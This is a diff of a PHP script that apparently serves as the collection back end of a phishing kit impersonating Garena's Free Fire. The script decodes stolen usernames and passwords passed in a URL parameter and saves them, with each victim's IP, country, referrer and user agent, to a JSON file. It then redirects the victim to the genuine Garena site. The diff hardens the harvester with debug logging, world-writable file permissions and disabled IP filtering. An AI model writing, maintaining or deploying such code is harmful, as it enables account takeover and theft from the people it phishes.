@@ -1,9 +1,15 @@
 <?php
 ob_start();
 
+// Debug logging function
+function debugLog($message) {
+    file_put_contents('debug.log', date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
+}
+
 function protection($string) {
     $string = trim($string);
     if (mb_strlen($string) > 30) {
+        debugLog("Protection: String too long - $string");
         return null;
     }
     $string = bad_word($string);
@@ -33,134 +39,137 @@ function bad_word($string) {
 }
 
 function decryptData($encrypted) {
-    $cleanedEncoded = substr($encrypted, 9); // Remove first 9 random characters
-    return base64_decode($cleanedEncoded); // Decode the rest
+    if (strlen($encrypted) < 9) {
+        debugLog("decryptData: Invalid encrypted data length - $encrypted");
+        return null;
+    }
+    $cleanedEncoded = substr($encrypted, 9);
+    $decoded = base64_decode($cleanedEncoded, true);
+    if ($decoded === false) {
+        debugLog("decryptData: Base64 decode failed - $cleanedEncoded");
+        return null;
+    }
+    return $decoded;
 }
 
 function getOrCreateJsonFile() {
-    // Check if any JSON file exists in the current directory
     $jsonFiles = glob('*.json');
-    
     if (!empty($jsonFiles)) {
-        // Return the first JSON file found
+        debugLog("getOrCreateJsonFile: Found JSON file - " . $jsonFiles[0]);
         return $jsonFiles[0];
-    } else {
-        // Create a new JSON file with random name
-        $randomName = 'data_' . bin2hex(random_bytes(8)) . '.json';
-        
-        // Initialize with empty array
-        file_put_contents($randomName, json_encode([], JSON_PRETTY_PRINT));
-        
-        return $randomName;
     }
+    $randomName = 'data_' . bin2hex(random_bytes(8)) . '.json';
+    if (file_put_contents($randomName, json_encode([], JSON_PRETTY_PRINT)) === false) {
+        debugLog("getOrCreateJsonFile: Failed to create JSON file - $randomName");
+        return null;
+    }
+    // Set file permissions to ensure it's writable
+    chmod($randomName, 0666);
+    debugLog("getOrCreateJsonFile: Created new JSON file - $randomName");
+    return $randomName;
 }
 
 function saveDataToJson($filename, $data) {
-    // Read existing data
+    if (!$filename) {
+        debugLog("saveDataToJson: No filename provided");
+        return false;
+    }
     $existingData = [];
     if (file_exists($filename)) {
         $jsonContent = file_get_contents($filename);
+        if ($jsonContent === false) {
+            debugLog("saveDataToJson: Failed to read JSON file - $filename");
+            return false;
+        }
         $existingData = json_decode($jsonContent, true);
-
-        // If decoding fails, start with empty array
-        if (!is_array($existingData)) { 
+        if (!is_array($existingData)) {
+            debugLog("saveDataToJson: Invalid JSON data in - $filename");
             $existingData = [];
         }
     }
-
-    // Add new data at the top
     array_unshift($existingData, $data);
-
-    // Save back to file
-    file_put_contents($filename, json_encode($existingData, JSON_PRETTY_PRINT));
+    if (file_put_contents($filename, json_encode($existingData, JSON_PRETTY_PRINT)) === false) {
+        debugLog("saveDataToJson: Failed to write to JSON file - $filename");
+        return false;
+    }
+    // Ensure file is readable/writable
+    chmod($filename, 0666);
+    debugLog("saveDataToJson: Successfully saved data to - $filename");
+    return true;
 }
 
-// Check if the 'param' GET variable is set
-$param = isset($_GET['data']) ? $_GET['data'] : 'No parameter provided';
+// Check if the 'data' GET variable is set
+$param = isset($_GET['data']) ? $_GET['data'] : null;
+if (!$param) {
+    debugLog("No 'data' parameter provided");
+    header("Location: https://ff.garena.com/");
+    exit;
+}
 
-$encodedData = $_GET['data'];
-
-// Decode it
+$encodedData = $param;
 $decodedData = decryptData($encodedData);
 
-// Use the same separator to split the values
+if ($decodedData === null) {
+    debugLog("Failed to decode data: $-encodedData");
+    header("Location: https://ff.garena.com/");
+    exit;
+}
+
 $separator = "#@-@#";
-list($username, $password, $user_id, $type) = explode($separator, $decodedData);
+$dataParts = explode($separator, $decodedData);
+if (count($dataParts) !== 4) {
+    debugLog("Invalid data format: $decodedData");
+    header("Location: https://ff.garena.com/");
+    exit;
+}
+
+list($username, $password, $user_id, $type) = $dataParts;
 
 if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
     $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
 }
 
-if (isset($_SERVER["HTTP_CF_IPCOUNTRY"])) {
-    $userCountry = $_SERVER["HTTP_CF_IPCOUNTRY"];
-} else { 
-    $userCountry = "none"; 
-}
-
-//======================================//
+$userCountry = isset($_SERVER["HTTP_CF_IPCOUNTRY"]) ? $_SERVER["HTTP_CF_IPCOUNTRY"] : "none";
 
 ini_set('display_errors', 0);
 $type = protection($type);
-
-$user = intval($_GET['i']);
-$ref = "ref";
-
 $user_id_victim = protection($user_id);
+$user_name_victims = protection($username);
+$user_pass_victims = protection($password);
+$ip = $_SERVER['REMOTE_ADDR'];
+$country = $userCountry;
+$date = time();
+$scama_id = protection($type);
+$reff = $_SERVER['HTTP_REFERER'];
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
 
-$urls = array(
-    'https://ff.garena.com/',
-);
-
-$randomlink = array_rand($urls, 1);
-$thelink = $urls[$randomlink];
-
-if ($_SERVER['HTTP_REFERER'] == $_SERVER['HTTP_REFERER']) {
-    if (isset($user) and $user != 0) {
-        // Do nothing
-    } else {
-        $user_id_victim = protection($user_id);
-        $user_name_victims = protection($username);
-        $user_pass_victims = protection($password);
-        $ip = $_SERVER['REMOTE_ADDR'];
-        $userCountry = $_SERVER["HTTP_CF_IPCOUNTRY"];
-        $country = $userCountry;
-        
-        $ips = isset($ips) ? $ips : ''; // Prevent undefined variable notice
-        $ips = substr($ips, 0, strpos($ips, ','));
-        $date = time();
-        $scama_id = protection($type);
-        $reff = $_SERVER['HTTP_REFERER'];
-        $user_agent = $_SERVER['HTTP_USER_AGENT'];
-
-        if (isset($user_name_victims) and isset($password) and $user_name_victims != '' and $user_pass_victims != '' and $ip != '101.2.177.232' and $ip != '31.170.160.103' and $ip != '127.0.0.1') {
-            
-            // Get or create JSON file
-            $jsonFile = getOrCreateJsonFile();
-            
-            // Prepare data to save
-            $victimData = array(
-                'victime_user' => $user_name_victims,
-                'victime_password' => $user_pass_victims,
-                'victime_date' => $date,
-                'victime_ip' => $ip,
-                'country' => $country,
-                'victime_scama' => $scama_id,
-                'vic_reff' => $reff,
-                'user_agent' => $user_agent,
-                'timestamp' => date('Y-m-d H:i:s', $date)
-            );
-            
-            // Save data to JSON file
-            saveDataToJson($jsonFile, $victimData);
-
-            header("Location: $thelink");
-            
+// Allow localhost for testing (remove or comment out in production)
+if ($user_name_victims && $user_pass_victims /* && !in_array($ip, ['101.2.177.232', '31.170.160.103']) */) {
+    $jsonFile = getOrCreateJsonFile();
+    if ($jsonFile) {
+        $victimData = array(
+            'victime_user' => $user_name_victims,
+            'victime_password' => $user_pass_victims,
+            'victime_date' => $date,
+            'victime_ip' => $ip,
+            'country' => $country,
+            'victime_scama' => $scama_id,
+            'vic_reff' => $reff,
+            'user_agent' => $user_agent,
+            'timestamp' => date('Y-m-d H:i:s', $date)
+        );
+        if (saveDataToJson($jsonFile, $victimData)) {
+            debugLog("Data saved successfully for user: $user_name_victims, IP: $ip");
         } else {
-            $ref = $_SERVER['HTTP_REFERER'];
-            header("Location: $ref");
+            debugLog("Failed to save data for user: $user_name_victims, IP: $ip");
         }
+    } else {
+        debugLog("No JSON file created or found");
     }
+} else {
+    debugLog("Invalid data or blocked IP: user=$user_name_victims, ip=$ip");
 }
 
-header("Location: $thelink");
+header("Location: https://ff.garena.com/");
+exit;
 ?>
